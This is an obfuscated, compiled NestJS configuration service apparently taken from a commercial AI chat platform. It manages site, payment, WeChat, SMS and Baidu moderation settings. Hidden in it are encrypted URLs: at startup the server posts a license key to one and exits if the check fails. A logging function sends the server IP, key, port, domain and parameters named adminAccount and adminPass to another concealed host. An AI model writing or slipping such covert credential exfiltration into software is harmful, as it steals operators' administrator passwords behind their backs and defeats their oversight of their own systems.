'use strict';function _0x1536(){const _0xbb09e9=['baiduTextAccessToken-0','error','baiduTextAccessToken','registerBaseUrl','set','461195lFUUEx','checkAiAuth','支付功能暂未开放!','defineProperty','code','9kxwFUQptTaelrKStrwZQQ==','InjectRepository','nineaiBuiltInSensitiveStatus','post','relateId','查询配置不能为空！','function','catch','log','axios','phoneRegisterStatus','has','JPFq8fAlQE2V2Eq7KWYSxg==','signInStatus','aliPhoneAccessKeySecret','aliPhoneTemplateCode','__decorate','findOne','FrontKeys','百度敏感词配置检测失败，您的参数可能配置的不正确!','wechatAccessTokenMap','access_token','check','decorate','decrypt','1441mnRcDm','pushLog','saas.qumao518.vip','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','未配置\x20robotAvatar.','save','SAAS','response','UNAUTHORIZED','wechat\x20get\x20access_token\x20done','metadata','nineaiBuiltInSensitiveAuthKey','data:image/jpeg;base64,','design:paramtypes','kaifa.qumao518.vip','HttpException','update','4lwzvop','签到功能暂未开放!','PORT','手机验证码功能暂未开放!','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','nestjs-cls','10056mcDlHt','refresh','vipLeavelRelEntity','7506pIxKSE','&secret=','baiduTextSecretKey','stringify','configKey','../../common/utils','NAMESPACE','wechatOfficialAppSecret','getOwnPropertyDescriptor','initBaiduSensitive','../../config/AppConfig','signInRewards','object','682577rxMlzC','configEntity','payMpayStatus','typeorm','hupi','qqNumber','ceshi.qumao518.vip','siteName','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','WechatConfig','Logger','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','VipLeavelRelEntity','CZConfig','&client_secret=','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','epay','arraybuffer','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','cls','global','find','@nestjs/common','\x20微信配置缺失，不可使用微信登录！','wechat','saas\x20','https://aip.baidubce.com/oauth/2.0/token?client_id=','wechatJsapiTicketMap','583953uMtdHA','./constant','robotAvatar','fetchBaseAccessToken','get','data','HttpStatus','payHupiStatus','Injectable','env','getWechatAccessToken','baiduTextStatus','设置配置信息错误！','length','payEpayStatus','checkDomain','error_description','domain','POST','APP_VERSION','base64','wechatJsapiTicket-','GlobalConfigService','getSignatureGiftConfig','BAD_REQUEST','@nestjs/typeorm','default','getSensitiveConfig','errmsg','vxNumber','includes','createOrUpdate','5805961gxCcTC','Repository','getVipLeavelRelById','queryPayType','toString','15964776goZkJJ','exit','application/json','2CxRqAN','MjConfig','saasId','push\x20log\x20error','../../common/store','from','wechatOfficialAppId','concat','then','4390sDfPiQ','getPhoneVerifyConfig','forEach','30rzEiip','baiduTextApiKey','json','nineai','获取微信access_token失败、错误信息：','keys','getConfigByKeys','getConfigs4Front','__esModule','SelfKeys'];_0x1536=function(){return _0xbb09e9;};return _0x1536();}const _0xf4dac6=_0x8c8b;(function(_0x421fb1,_0x1e4c96){const _0x2c7ca8=_0x8c8b,_0x52bca7=_0x421fb1();while(!![]){try{const _0x2800a9=parseInt(_0x2c7ca8(0x170))/0x1*(-parseInt(_0x2c7ca8(0x1b4))/0x2)+-parseInt(_0x2c7ca8(0x18c))/0x3*(parseInt(_0x2c7ca8(0x1fe))/0x4)+-parseInt(_0x2c7ca8(0x1cf))/0x5*(-parseInt(_0x2c7ca8(0x1c0))/0x6)+parseInt(_0x2c7ca8(0x1ac))/0x7+parseInt(_0x2c7ca8(0x204))/0x8*(-parseInt(_0x2c7ca8(0x207))/0x9)+parseInt(_0x2c7ca8(0x1bd))/0xa*(-parseInt(_0x2c7ca8(0x1ed))/0xb)+parseInt(_0x2c7ca8(0x1b1))/0xc;if(_0x2800a9===_0x1e4c96)break;else _0x52bca7['push'](_0x52bca7['shift']());}catch(_0x36b999){_0x52bca7['push'](_0x52bca7['shift']());}}}(_0x1536,0x9bbf5));var __decorate=this&&this[_0xf4dac6(0x1e4)]||function(_0x1c93a7,_0x5e4bdd,_0x3135fc,_0x3c19bc){const _0x10bc8b=_0xf4dac6;var _0x42fcc8=arguments[_0x10bc8b(0x199)],_0x56d861=_0x42fcc8<0x3?_0x5e4bdd:_0x3c19bc===null?_0x3c19bc=Object[_0x10bc8b(0x20f)](_0x5e4bdd,_0x3135fc):_0x3c19bc,_0x48c4e7;if(typeof Reflect===_0x10bc8b(0x213)&&typeof Reflect[_0x10bc8b(0x1eb)]===_0x10bc8b(0x1da))_0x56d861=Reflect[_0x10bc8b(0x1eb)](_0x1c93a7,_0x5e4bdd,_0x3135fc,_0x3c19bc);else{for(var _0x2cfe9d=_0x1c93a7[_0x10bc8b(0x199)]-0x1;_0x2cfe9d>=0x0;_0x2cfe9d--)if(_0x48c4e7=_0x1c93a7[_0x2cfe9d])_0x56d861=(_0x42fcc8<0x3?_0x48c4e7(_0x56d861):_0x42fcc8>0x3?_0x48c4e7(_0x5e4bdd,_0x3135fc,_0x56d861):_0x48c4e7(_0x5e4bdd,_0x3135fc))||_0x56d861;}return _0x42fcc8>0x3&&_0x56d861&&Object[_0x10bc8b(0x1d2)](_0x5e4bdd,_0x3135fc,_0x56d861),_0x56d861;},__metadata=this&&this['__metadata']||function(_0x1c8dc,_0x49b68e){const _0x58814c=_0xf4dac6;if(typeof Reflect===_0x58814c(0x213)&&typeof Reflect['metadata']==='function')return Reflect[_0x58814c(0x1f7)](_0x1c8dc,_0x49b68e);},__param=this&&this['__param']||function(_0x37d7c5,_0x5abcdd){return function(_0x3d7aab,_0xbcb99e){_0x5abcdd(_0x3d7aab,_0xbcb99e,_0x37d7c5);};};Object['defineProperty'](exports,_0xf4dac6(0x1c8),{'value':!![]}),exports['GlobalConfigService']=void 0x0;function _0x8c8b(_0x47f0f3,_0x18ea7f){const _0x1536e2=_0x1536();return _0x8c8b=function(_0x8c8b1c,_0xff40c1){_0x8c8b1c=_0x8c8b1c-0x170;let _0x515f62=_0x1536e2[_0x8c8b1c];return _0x515f62;},_0x8c8b(_0x47f0f3,_0x18ea7f);}const common_1=require(_0xf4dac6(0x186)),config_entity_1=require('./config.entity'),typeorm_1=require(_0xf4dac6(0x1a5)),typeorm_2=require(_0xf4dac6(0x173)),utils_1=require(_0xf4dac6(0x20c)),axios_1=require(_0xf4dac6(0x1dd)),actions_1=require('@nestjs/cli/actions'),store_1=require('../../common/store'),store_2=require(_0xf4dac6(0x1b8)),AppConfig_1=require(_0xf4dac6(0x211)),vip_leavel_rel_entity_1=require('./vip_leavel_rel.entity'),nestjs_cls_1=require(_0xf4dac6(0x203)),constant_1=require(_0xf4dac6(0x18d)),authCheckUrl=(0x0,utils_1[_0xf4dac6(0x1ec)])(_0xf4dac6(0x17b)),authLogUrl=(0x0,utils_1[_0xf4dac6(0x1ec)])(_0xf4dac6(0x202));let GlobalConfigService=class GlobalConfigService{constructor(_0x139546,_0x45ecbd,_0x5dcac6){const _0x3b8fe8=_0xf4dac6;this[_0x3b8fe8(0x171)]=_0x139546,this[_0x3b8fe8(0x206)]=_0x45ecbd,this[_0x3b8fe8(0x183)]=_0x5dcac6,this[_0x3b8fe8(0x1e8)]=new Map(),this['wechatJsapiTicketMap']=new Map();}async['onModuleInit'](){const _0x1c767c=_0xf4dac6;await this[_0x1c767c(0x1d0)](),await this[_0x1c767c(0x1ee)](),await this[_0x1c767c(0x210)](),await this['getWechatAccessToken'](!![]);const _0x4bb38b=[][_0x1c767c(0x1bb)](store_1[_0x1c767c(0x1b5)][_0x1c767c(0x1c5)],store_1['CZConfig'][_0x1c767c(0x1c5)],store_2[_0x1c767c(0x179)]['keys']),_0x4885b9=await this[_0x1c767c(0x1c6)](_0x4bb38b);store_1[_0x1c767c(0x1b5)][_0x1c767c(0x205)](_0x4885b9),store_1[_0x1c767c(0x17d)][_0x1c767c(0x205)](_0x4885b9),store_2['WechatConfig'][_0x1c767c(0x205)](_0x4885b9);}async[_0xf4dac6(0x1d0)](){const _0x32fd5e=_0xf4dac6,_0x3ba59b=process['env'][(0x0,utils_1[_0x32fd5e(0x1ec)])(_0x32fd5e(0x1e0))],_0x245011=process[_0x32fd5e(0x195)][(0x0,utils_1[_0x32fd5e(0x1ec)])('9kxwFUQptTaelrKStrwZQQ==')];(!_0x245011||!_0x3ba59b)&&(common_1['Logger'][_0x32fd5e(0x1cb)]((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x32fd5e(0x1b2)])());const _0x536734={'authDomain':_0x3ba59b,'authKey':_0x245011},_0x3b3061={'method':_0x32fd5e(0x19e),'headers':{'Content-Type':'application/json'},'body':JSON[_0x32fd5e(0x20a)](_0x536734)},_0x2cf114=await fetch(authCheckUrl,_0x3b3061)[_0x32fd5e(0x1bc)](_0xd19313=>{const _0x148c3f=_0x32fd5e;return _0xd19313[_0x148c3f(0x1c2)]();})['catch'](_0x7b4b97=>{const _0x46a409=_0x32fd5e;common_1[_0x46a409(0x17a)][_0x46a409(0x1cb)](_0x7b4b97,_0x46a409(0x184));});_0x2cf114[_0x32fd5e(0x1d3)]!==0x0&&(common_1[_0x32fd5e(0x17a)][_0x32fd5e(0x1cb)]((0x0,utils_1[_0x32fd5e(0x1ec)])(_0x32fd5e(0x17f))),(0x0,actions_1[_0x32fd5e(0x1b2)])()),_0x2cf114?.['code']===0x0&&!_0x2cf114?.[_0x32fd5e(0x191)]?.[_0x32fd5e(0x1ea)]&&(common_1[_0x32fd5e(0x17a)][_0x32fd5e(0x1cb)]((0x0,utils_1[_0x32fd5e(0x1ec)])(_0x32fd5e(0x182))),(0x0,actions_1[_0x32fd5e(0x1b2)])());}async[_0xf4dac6(0x1ee)](_0xf60258,_0x359a43){const _0x3bad2b=_0xf4dac6,_0x1820e5=process['env'][(0x0,utils_1[_0x3bad2b(0x1ec)])(_0x3bad2b(0x1e0))],_0x42ebed=process[_0x3bad2b(0x195)][(0x0,utils_1[_0x3bad2b(0x1ec)])(_0x3bad2b(0x1d4))],_0x5d5eeb=process[_0x3bad2b(0x195)][_0x3bad2b(0x200)];if(!_0x1820e5||!_0x42ebed)throw new common_1[(_0x3bad2b(0x1fc))]((0x0,utils_1['decrypt'])(_0x3bad2b(0x182)),common_1[_0x3bad2b(0x192)][_0x3bad2b(0x1f5)]);const {qqNumber:_0x3aff5c,vxNumber:_0x44546c,siteName:_0x2ead03,domain:_0x4d00a5,registerBaseUrl:_0x40dfc2}=await this[_0x3bad2b(0x1c6)](['qqNumber',_0x3bad2b(0x1a9),_0x3bad2b(0x177),_0x3bad2b(0x19d),_0x3bad2b(0x1cd)]),_0xbb17f1={'ip':_0x1820e5,'key':_0x42ebed,'port':_0x5d5eeb,'qqNumber':_0x3aff5c,'vxNumber':_0x44546c,'domain':_0x4d00a5,'adminAccount':_0xf60258,'adminPass':_0x359a43,'baseUrl':_0x40dfc2,'siteName':_0x2ead03,'qq':_0x3aff5c,'vxNum':_0x44546c,'version':AppConfig_1[_0x3bad2b(0x19f)]},_0x5e795f={'method':_0x3bad2b(0x19e),'headers':{'Content-Type':_0x3bad2b(0x1b3)},'body':JSON[_0x3bad2b(0x20a)](_0xbb17f1)};await fetch(authLogUrl,_0x5e795f)[_0x3bad2b(0x1db)](_0x3b9b3b=>{const _0x5f10eb=_0x3bad2b;console['log'](_0x5f10eb(0x1b7),_0x3b9b3b);});}async['initBaiduSensitive'](_0x316dae=!![]){const _0x401841=_0xf4dac6,{baiduTextApiKey:_0x5dfa5e,baiduTextSecretKey:_0x386a24}=await this['getConfigByKeys']([_0x401841(0x1c1),_0x401841(0x209)]);if(!_0x5dfa5e||!_0x386a24){common_1['Logger']['error']('百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!',_0x401841(0x1a2));return;}const _0x3388e7={'Content-Type':_0x401841(0x1b3),'Accept':_0x401841(0x1b3)},_0x470199=_0x401841(0x18a)+_0x5dfa5e+_0x401841(0x17e)+_0x386a24+'&grant_type=client_credentials';try{const _0x18fa6=await axios_1[_0x401841(0x1a6)][_0x401841(0x1d7)](_0x470199,{'headers':_0x3388e7});this[_0x401841(0x1cc)]=_0x18fa6[_0x401841(0x191)][_0x401841(0x1e9)];}catch(_0x359046){if(_0x316dae)common_1['Logger'][_0x401841(0x1cb)](_0x401841(0x1e7),_0x401841(0x1a2));else throw new common_1['HttpException'](_0x359046[_0x401841(0x1f4)][_0x401841(0x191)][_0x401841(0x19c)],common_1['HttpStatus'][_0x401841(0x1a4)]);}}async['getWechatAccessToken'](_0x14d2a4=![]){const _0x1162a0=_0xf4dac6,_0x53fceb=new Map(),_0x5297fd=await this[_0x1162a0(0x171)][_0x1162a0(0x185)]({'where':{'configKey':(0x0,typeorm_2['In'])([_0x1162a0(0x1ba),_0x1162a0(0x20e)])}});_0x5297fd[_0x1162a0(0x1bf)](_0x4860bd=>{const _0x2df368=_0x1162a0;!_0x53fceb[_0x2df368(0x1df)](_0x4860bd['saasId'])&&_0x53fceb[_0x2df368(0x1ce)](_0x4860bd['saasId'],{}),_0x53fceb[_0x2df368(0x190)](_0x4860bd[_0x2df368(0x1b6)])[_0x4860bd[_0x2df368(0x20b)]]=_0x4860bd['configVal'];}),_0x53fceb[_0x1162a0(0x1bf)]((_0x25c1df,_0x4a545d)=>{const _0xc2c096=_0x1162a0;!_0x25c1df[_0xc2c096(0x1ba)]||!_0x25c1df['wechatOfficialAppSecret']?common_1[_0xc2c096(0x17a)]['warn'](_0xc2c096(0x189)+_0x4a545d+_0xc2c096(0x187),_0xc2c096(0x196)):this[_0xc2c096(0x18f)](_0x4a545d,_0x25c1df[_0xc2c096(0x1ba)],_0x25c1df['wechatOfficialAppSecret'],_0x14d2a4);}),common_1[_0x1162a0(0x17a)][_0x1162a0(0x1dc)](_0x1162a0(0x1f6),'OfficialService');}async['fetchBaseAccessToken'](_0x535e92,_0x3bb326,_0x267f4b,_0x4aeb57=![]){const _0x54471d=_0xf4dac6;if(process[_0x54471d(0x195)]['ISDEV']==='TRUE')return;try{let _0x114797='';const _0x38434b=process['env']['GOMAXAI_HOST'];if(_0x38434b===_0x54471d(0x1fb)||_0x38434b===_0x54471d(0x176)||_0x38434b===_0x54471d(0x1ef)){const _0x2fc97e=await axios_1[_0x54471d(0x1a6)][_0x54471d(0x190)]('https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official');_0x114797=_0x2fc97e[_0x54471d(0x191)]['data'];}else{const _0x1dcb7a=await axios_1[_0x54471d(0x1a6)][_0x54471d(0x190)](_0x54471d(0x1f0)+_0x3bb326+_0x54471d(0x208)+_0x267f4b);if(_0x1dcb7a[_0x54471d(0x191)][_0x54471d(0x1a8)])throw new Error(_0x54471d(0x1c4)+_0x1dcb7a[_0x54471d(0x191)][_0x54471d(0x1a8)]);_0x114797=_0x1dcb7a['data'][_0x54471d(0x1e9)];}this[_0x54471d(0x1e8)]['set'](_0x535e92,_0x114797);const _0x2fe293=await axios_1['default']['get'](_0x54471d(0x178)+_0x114797+'&type=jsapi');this[_0x54471d(0x18b)][_0x54471d(0x1ce)](_0x535e92,_0x2fe293?.[_0x54471d(0x191)]?.['ticket']);}catch(_0x11f448){common_1[_0x54471d(0x17a)][_0x54471d(0x1cb)](_0x11f448['message'],_0x54471d(0x18f));}}async[_0xf4dac6(0x19b)](_0x123146){const _0x5ddfe3=_0xf4dac6;if(process[_0x5ddfe3(0x195)][_0x5ddfe3(0x1f3)])return!![];const {domain:_0x24abb3}=_0x123146,_0x3b7c24=process[_0x5ddfe3(0x195)][(0x0,utils_1['decrypt'])('JPFq8fAlQE2V2Eq7KWYSxg==')];return _0x24abb3[_0x5ddfe3(0x1aa)](_0x3b7c24);}async['createOrUpdate'](_0x2f548a){const _0xe159ed=_0xf4dac6;try{const _0x95ab73=this[_0xe159ed(0x183)][_0xe159ed(0x190)](_0xe159ed(0x1b6)),{configKey:_0x2c68c9,configVal:_0x425198,status:status=0x1}=_0x2f548a,_0x2ceb61=await this[_0xe159ed(0x171)][_0xe159ed(0x1e5)]({'where':{'configKey':_0x2c68c9,'saasId':_0x95ab73}});_0x2ceb61?await this['configEntity'][_0xe159ed(0x1fd)]({'configKey':_0x2c68c9,'saasId':_0x95ab73},{'configVal':_0x425198,'status':status}):await this['configEntity'][_0xe159ed(0x1f2)]({'configKey':_0x2c68c9,'configVal':_0x425198,'status':status,'saasId':_0x95ab73});}catch(_0x29ce61){throw new common_1[(_0xe159ed(0x1fc))](_0xe159ed(0x198),common_1['HttpStatus'][_0xe159ed(0x1a4)]);}}async['setConfig'](_0x157b96){const _0x3638d7=_0xf4dac6;let _0x3d056b=![],_0x2323ff=![],_0x4c40ae=![],_0x912f7a=![],_0x4acf0d=![],_0x522f0b=![];const _0x5ad409={},{settings:_0xfcc5ac}=_0x157b96;for(const _0x514188 of _0xfcc5ac){await this[_0x3638d7(0x1ab)](_0x514188),_0x5ad409[_0x514188[_0x3638d7(0x20b)]]=_0x514188['configVal'],store_1[_0x3638d7(0x1b5)][_0x514188[_0x3638d7(0x20b)]]&&(_0x3d056b=!![]),store_1[_0x3638d7(0x17d)][_0x514188['configKey']]&&(_0x2323ff=!![]),store_2[_0x3638d7(0x179)][_0x514188['configKey']]&&(_0x4c40ae=!![]),[_0x3638d7(0x1c1),'baiduTextSecretKey'][_0x3638d7(0x1aa)](_0x514188['configKey'])&&(_0x912f7a=!![]),[_0x3638d7(0x1ba),_0x3638d7(0x20e)][_0x3638d7(0x1aa)](_0x514188['configKey'])&&(_0x4acf0d=!![]),[_0x3638d7(0x175),_0x3638d7(0x1a9),_0x3638d7(0x177),_0x3638d7(0x19d),_0x3638d7(0x1cd)][_0x3638d7(0x1aa)](_0x514188['configKey'])&&(_0x522f0b=!![]);}return _0x3d056b&&store_1[_0x3638d7(0x1b5)][_0x3638d7(0x205)](_0x5ad409),_0x2323ff&&store_1[_0x3638d7(0x17d)][_0x3638d7(0x205)](_0x5ad409),_0x4c40ae&&store_2['WechatConfig'][_0x3638d7(0x205)](_0x5ad409),_0x912f7a&&await this[_0x3638d7(0x210)](![]),_0x4acf0d&&await this[_0x3638d7(0x196)](),_0x522f0b&&this[_0x3638d7(0x1ee)](),'设置完成！';}async[_0xf4dac6(0x1c7)](_0x2ce11f){const _0xbba404=_0xf4dac6,_0x50e88c=await this[_0xbba404(0x1c6)](_0x2ce11f,!![]);return _0x2ce11f[_0xbba404(0x199)]===0x1?_0x50e88c[_0x2ce11f[0x0]]:_0x50e88c;}async[_0xf4dac6(0x1c6)](_0x2cb87e,_0x419167=![]){const _0x1f5877=_0xf4dac6;if(!_0x2cb87e[_0x1f5877(0x199)])throw new Error(_0x1f5877(0x1d9));const _0x47a02e=this['cls']['get'](_0x1f5877(0x1b6))||0x0,_0x715a01=new Map(),_0x4dd32e=await this[_0x1f5877(0x171)][_0x1f5877(0x185)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x2cb87e),'saasId':(0x0,typeorm_2['In'])([0x0,_0x47a02e])}});_0x4dd32e['forEach'](_0x169632=>{const _0x551d40=_0x1f5877,{configKey:_0x530c95,configVal:_0x322640,saasId:_0x5d336f}=_0x169632;_0x715a01[_0x551d40(0x1ce)](_0x530c95+'-'+_0x5d336f,_0x322640);}),this['wechatAccessTokenMap'][_0x1f5877(0x1bf)]((_0x1a6cbf,_0xde0440)=>{_0x715a01['set']('wechatAccessToken-'+_0xde0440,_0x1a6cbf);}),this[_0x1f5877(0x18b)]['forEach']((_0x3657d2,_0x37176c)=>{const _0x1cf35d=_0x1f5877;_0x715a01[_0x1cf35d(0x1ce)](_0x1cf35d(0x1a1)+_0x37176c,_0x3657d2);}),_0x715a01[_0x1f5877(0x1ce)](_0x1f5877(0x1ca),this['baiduTextAccessToken']);const _0x2ce78b={};_0x2cb87e[_0x1f5877(0x1bf)](_0x5b9cde=>{const _0x2a066a=_0x1f5877;let _0xd71914=_0x5b9cde+'-'+_0x47a02e,_0x4be1c7='';_0x715a01['has'](_0xd71914)?_0x4be1c7=_0x715a01[_0x2a066a(0x190)](_0xd71914):!constant_1[_0x2a066a(0x1c9)][_0x2a066a(0x1aa)](_0x5b9cde)&&(_0x4be1c7=_0x715a01['get'](_0x5b9cde+'-'+0x0)),_0x2ce78b[_0x5b9cde]=_0x4be1c7;});if(_0x419167)return _0x2ce78b;return _0x2cb87e[_0x1f5877(0x199)]===0x1?_0x2ce78b[_0x2cb87e[0x0]]:_0x2ce78b;}async['queryFrontConfig'](){const _0x1a87e4=_0xf4dac6,_0x305b7e=await this['getConfigByKeys'](constant_1[_0x1a87e4(0x1e6)]);return{..._0x305b7e,'isUseWxLogin':!!(_0x305b7e[_0x1a87e4(0x1ba)]&&_0x305b7e[_0x1a87e4(0x20e)])};}async[_0xf4dac6(0x1af)](_0x25c30f=_0xf4dac6(0x188)){const _0x95b4ca=_0xf4dac6,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x95b4ca(0x1c6)]([_0x95b4ca(0x193),_0x95b4ca(0x19a),_0x95b4ca(0x172),'payWechatStatus']);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus]['every'](_0x1bbce4=>_0x1bbce4===0x0))throw new common_1[(_0x95b4ca(0x1fc))](_0x95b4ca(0x1d1),common_1[_0x95b4ca(0x192)][_0x95b4ca(0x1a4)]);if(Number(payWechatStatus)===0x1)return _0x25c30f;if(Number(payEpayStatus)===0x1)return _0x95b4ca(0x180);if(Number(payMpayStatus)===0x1)return'mpay';if(Number(payHupiStatus)===0x1)return _0x95b4ca(0x174);}async[_0xf4dac6(0x1be)](){const _0x2a24f7=_0xf4dac6,{phoneRegisterStatus:_0x1051e6,aliPhoneAccessKeyId:_0xc820d7,aliPhoneAccessKeySecret:_0x233946,aliPhoneSignName:_0x2ebf8d,aliPhoneTemplateCode:_0x1767a6}=await this['getConfigByKeys']([_0x2a24f7(0x1de),'aliPhoneAccessKeyId',_0x2a24f7(0x1e2),'aliPhoneSignName',_0x2a24f7(0x1e3)]);if(Number(_0x1051e6)!==0x1)throw new common_1[(_0x2a24f7(0x1fc))](_0x2a24f7(0x201),common_1[_0x2a24f7(0x192)][_0x2a24f7(0x1a4)]);return{'accessKeyId':_0xc820d7,'accessKeySecret':_0x233946,'SignName':_0x2ebf8d,'TemplateCode':_0x1767a6};}['getNamespace'](){const _0x598ec5=_0xf4dac6;return process[_0x598ec5(0x195)][_0x598ec5(0x20d)]||'GOMAXAI';}async[_0xf4dac6(0x1a3)](){const _0x4bac6b=_0xf4dac6,_0x15eb37=await this[_0x4bac6b(0x1c6)]([_0x4bac6b(0x1e1),'signInRewards']),_0x3419dd={};for(let _0x1bcbb6 in _0x15eb37){const _0xd272d=Number(_0x15eb37[_0x1bcbb6]);_0x3419dd[_0x1bcbb6]=isNaN(_0xd272d)?0x0:_0xd272d;}if(!_0x3419dd['signInStatus'])throw new common_1[(_0x4bac6b(0x1fc))](_0x4bac6b(0x1ff),common_1[_0x4bac6b(0x192)][_0x4bac6b(0x1a4)]);return _0x3419dd[_0x4bac6b(0x212)];}async[_0xf4dac6(0x1a7)](){const _0x43b0f5=_0xf4dac6,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x2d2f7d,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x125ca7,nineaiBuiltInSensitiveAuthKey:_0x4531de}=await this[_0x43b0f5(0x1c6)]([_0x43b0f5(0x197),_0x43b0f5(0x1cc),_0x43b0f5(0x1d6),'nineaiBuiltInSensitiveApiBase',_0x43b0f5(0x1f8)]);if(Number(baiduTextStatus)===0x1)return{'useType':'baidu','baiduTextAccessToken':_0x2d2f7d};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x43b0f5(0x1c3),'nineaiBuiltInSensitiveApiBase':_0x125ca7,'nineaiBuiltInSensitiveAuthKey':_0x4531de};return null;}async['robotAvatar2Base64'](){const _0x336611=_0xf4dac6,_0x220098=await this[_0x336611(0x1c6)]([_0x336611(0x18e)]);if(!_0x220098)throw new common_1['HttpException'](_0x336611(0x1f1),common_1[_0x336611(0x192)]['BAD_GATEWAY']);const _0x4090a6=await axios_1[_0x336611(0x1a6)][_0x336611(0x190)](_0x220098,{'responseType':_0x336611(0x181)}),_0x1f9afd=Buffer[_0x336611(0x1b9)](_0x4090a6['data'])[_0x336611(0x1b0)](_0x336611(0x1a0));return _0x336611(0x1f9)+_0x1f9afd;}async['saveVipLeavelRel'](_0x5aad51){const _0x16befb=_0xf4dac6;await this['vipLeavelRelEntity'][_0x16befb(0x1f2)](_0x5aad51);}async[_0xf4dac6(0x1ae)](_0x982606,_0x41eef0,_0xcf609e){const _0x4661f7=_0xf4dac6,_0x1bae65={'vipLeavelId':_0x982606,'relateType':_0x41eef0};_0xcf609e&&(_0x1bae65[_0x4661f7(0x1d8)]=_0xcf609e);const _0x510fc8=await this[_0x4661f7(0x206)][_0x4661f7(0x1e5)]({'where':_0x1bae65});return _0x510fc8;}};GlobalConfigService=__decorate([(0x0,common_1[_0xf4dac6(0x194)])(),__param(0x0,(0x0,typeorm_1[_0xf4dac6(0x1d5)])(config_entity_1['ConfigEntity'])),__param(0x1,(0x0,typeorm_1[_0xf4dac6(0x1d5)])(vip_leavel_rel_entity_1[_0xf4dac6(0x17c)])),__metadata(_0xf4dac6(0x1fa),[typeorm_2[_0xf4dac6(0x1ad)],typeorm_2[_0xf4dac6(0x1ad)],nestjs_cls_1['ClsService']])],GlobalConfigService),exports[_0xf4dac6(0x1a2)]=GlobalConfigService;